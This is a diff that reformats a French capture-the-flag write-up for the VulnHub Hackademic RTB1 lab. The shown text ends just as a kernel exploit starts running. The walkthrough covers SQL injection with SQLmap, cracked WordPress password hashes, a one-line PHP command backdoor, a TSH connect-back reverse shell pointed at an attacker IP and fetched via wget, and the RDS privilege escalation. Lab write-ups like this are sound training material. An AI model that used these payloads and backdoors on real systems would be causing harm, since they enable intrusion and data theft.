@@ -8,7 +8,7 @@ Introduction
 
 Le challenge [Hackademic: RTB1](http://vulnhub.com/entry/hackademic_rtb1,17/) (toujours sur *VulnHub*) propose une image virtuelle *VMWare* d'un système Linux.  
 
-L'objectif de ce CTF est de lire le contenu du fichier */root/key.txt*  
+L'objectif de ce CTF est de lire le contenu du fichier `/root/key.txt`  
 
 Le système n'a pas beaucoup de ports ouverts, ce qui réduit nos angles d'attaque :  
 
@@ -30,10 +30,10 @@ MAC Address: 00:0C:29:1B:87:E3 (VMware)
 Webploitation
 -------------
 
-Si on accède au site on a une page d'accueil avec un lien vers */Hackademic\_RTB1/*. Les pages sont en PHP et prennent des paramètres. Je lance [Wapiti](http://wapiti.sourceforge.net/) (parce que *Wapiti* c'est bien ;-) ) sans plus tarder :  
+Si on accède au site on a une page d'accueil avec un lien vers `/Hackademic_RTB1/`. Les pages sont en PHP et prennent des paramètres. Je lance [Wapiti](http://wapiti.sourceforge.net/) (parce que *Wapiti* c'est bien ;-) ) sans plus tarder :  
 
-```
-> ./bin/wapiti http://192.168.1.62/Hackademic_RTB1/
+```console
+$ ./bin/wapiti http://192.168.1.62/Hackademic_RTB1/
 Wapiti-2.3.0 (wapiti.sourceforge.net)
 
  Note
@@ -87,12 +87,12 @@ Un rapport a été généré dans le fichier /tmp/.wapiti/generated_report
 Ouvrez /tmp/.wapiti/generated_report/index.html dans un navigateur pour voir ce rapport.
 ```
 
-Un bon nombre d'erreurs 500 a été retourné. Une faille XSS a été trouvée mais ce qui nous intéresse vraiment c'est la faille SQL dans le paramètre *cat*.  
+Un bon nombre d'erreurs 500 a été retourné. Une faille XSS a été trouvée, mais ce qui nous intéresse vraiment, c'est la faille SQL dans le paramètre `cat`.  
 
 On enchaîne sur [SQLmap](http://sqlmap.org/) (je coupe l'output qui est trop long) :  
 
-```
-python sqlmap.py -u "http://192.168.1.62/Hackademic_RTB1/?cat=1" --dbms=mysql -p cat
+```console
+$ python sqlmap.py -u "http://192.168.1.62/Hackademic_RTB1/?cat=1" --dbms=mysql -p cat
 
 sqlmap identified the following injection points with a total of 51 HTTP(s) requests:
 ---
@@ -115,20 +115,21 @@ web server operating system: Linux Fedora 13 (Goddard)
 web application technology: PHP 5.3.3, Apache 2.2.15
 ```
 
-Bien, *SQLmap* voit bien comment injecter du SQL dans la paramètre. On va pouvoir lui passer des options supplémentaires pour obtenir certaines infos comme :  
+Bien, *SQLmap* voit bien comment injecter du SQL dans le paramètre. On va pouvoir lui passer des options supplémentaires pour obtenir certaines infos comme :  
 
-* --current-user qui retourne 'root@localhost'
-* --current-db qui retourne 'wordpress'
-* --passwords qui nous retourne le hash 2eaec110380126d7 pour le user root
+* `--current-user` qui retourne `root@localhost`
+* `--current-db` qui retourne `wordpress`
+* `--passwords` qui nous retourne le hash `2eaec110380126d7` pour le user root
 
-Malheureusement, l'option *--os-shell* ne fonctionne pas, les droits sur */var/www/html/* doivent être trop restreints.  
+Malheureusement, l'option `--os-shell` ne fonctionne pas, les droits sur `/var/www/html/` doivent être trop restreints.  
 
-Avec les options de dump (comme *--dump-all* qui prends beaucoup de temps) on peut récupérer les tables MySQL.  
+Avec les options de dump (comme `--dump-all` qui prend beaucoup de temps) on peut récupérer les tables MySQL.  
 
-En l'occurence les pages vulnérables sont celles d'un vieux *WordPress 1.5.1.1*.  
+En l'occurrence les pages vulnérables sont celles d'un vieux *WordPress 1.5.1.1*.  
 
-Dans la table des utilisateurs ont trouve les passwords hashés en MD5, facilement cassables avec [MD5RDB](http://md5.noisette.ch/):  
+Dans la table des utilisateurs, on trouve les passwords hashés en MD5, facilement cassables avec [MD5RDB](http://md5.noisette.ch/):  
 
+```
 NickJames 21232f297a57a5a743894a0e4a801fc3 admin  
 
 JohnSmith b986448f0bb9e5e124ca91d3d650f52c PUPPIES  
@@ -140,34 +141,35 @@ TonyBlack a6e514f9486b83cb53d8d932f9a04292 napoleon
 JasonKonnors 8601f6e1028a8e8a966f6c33fcd9aec4 maxwell  
 
 MaxBucky 50484c19f1afdaf3841a0d821ed393d2 kernel  
+```
 
-On teste les différents logins sur l'interface d'administration *Wordpress* et on obtient un accès satisfaisant avec l'utilisateur *GeorgeMiller*.  
+On teste les différents logins sur l'interface d'administration *Wordpress* et on obtient un accès satisfaisant avec l'utilisateur `GeorgeMiller`.  
 
-En particulier il est possible d'éditer le contenu des modules PHP. On édite le fichier *wp-content/plugins/hello.php* et on peut l'appeler directement pour faire exécuter notre PHP.  
+En particulier il est possible d'éditer le contenu des modules PHP. On édite le fichier `wp-content/plugins/hello.php` et on peut l'appeler directement pour faire exécuter notre PHP.  
 
-Un *phpinfo()* révèle une configuration banale avec peu de protections (*safe\_mode off*, pas de fonctions désactivées).  
+Un `phpinfo()` révèle une configuration banale avec peu de protections (`safe_mode off`, pas de fonctions désactivées).  
 
 On ajoute une backdoor PHP toute simple :  
 
-```
+```php
 if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
 ```
 
 Puis on compile un [TSH](http://packetstormsecurity.com/files/31650/tsh-0.6.tgz.html) en mode connect-back (à cause de la présence du firewall) que l'on peut rapatrier via wget.  
 
-Pour compiler *TSH* en mode connect-back il faut éditer *tsh.h* et dé-commenter deux lignes, par exemple de cette façon :  
+Pour compiler *TSH* en mode connect-back il faut éditer `tsh.h` et dé-commenter deux lignes, par exemple de cette façon :  
 
 ```c
 #define CONNECT_BACK_HOST  "192.168.1.3"
 #define CONNECT_BACK_DELAY 10
 ```
 
-Après il faut lancer le client en mode connect-back sur notre machine (*./tsh cb*) puis le serveur via notre backdoor PHP (*./tshd*).  
+Après il faut lancer le client en mode connect-back sur notre machine (`./tsh cb`) puis le serveur via notre backdoor PHP (`./tshd`).  
 
 On est sur une *Fedora 12* 32bits avec un kernel 2.6.31 (*Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux*)  
 .
 
-Voici un extrait du /etc/passwd :  
+Voici un extrait du `/etc/passwd` :  
 
 ```
 root:x:0:0:root:/root:/bin/bash
@@ -186,15 +188,15 @@ mysql:x:27:480:MySQL Server:/var/lib/mysql:/bin/bash
 The way to root
 ---------------
 
-J'ai fouillé à la recherche d'une tâche mal définie dans *crontab*, les services et processus en cours ainsi que les programmes setuid, dossiers et fichiers world-writable, fichiers appartenant à *p0wnbox.Team* mais toujours sans résultats :(  
+J'ai fouillé à la recherche d'une tâche mal définie dans `crontab`, les services et processus en cours ainsi que les programmes setuid, dossiers et fichiers world-writable, fichiers appartenant à `p0wnbox.Team` mais toujours sans résultats :(  
 
 Il y a un serveur SMTP qui écoute derrière le firewall :  
 
-220 localhost.localdomain ESMTP Sendmail 8.14.3/8.14.3; Sun, 30 Mar 2014 14:03:54 +0300  
+`220 localhost.localdomain ESMTP Sendmail 8.14.3/8.14.3; Sun, 30 Mar 2014 14:03:54 +0300`  
 
 On obtient aisément le mot de passe de la BDD :  
 
-```
+```console
 sh-4.0$ cat wp-config.php
 <?php
 // ** MySQL settings ** //
@@ -204,11 +206,11 @@ define('DB_PASSWORD', 'lz5yedns'); // ...and password
 define('DB_HOST', 'localhost');     // 99% chance you won't need to change this value
 ```
 
-MySQL tourne sous l'utilisateur mysql, l'utilisation d'un *INTO OUTFILE* ne semble pas prometteuse...  
+MySQL tourne sous l'utilisateur mysql, l'utilisation d'un `INTO OUTFILE` ne semble pas prometteuse...  
 
 Finalement je me suis rabattu sur un exploit pour le noyau ([Linux RDS Protocol Local Privilege Escalation](http://www.exploit-db.com/exploits/15285/) par *Dan Rosenberg*) :  
 
-```
+```console
 bash-4.0$ gcc -o rds rds.c 
 bash-4.0$ ./rds
 [*] Linux kernel >= 2.6.30 RDS socket exploit
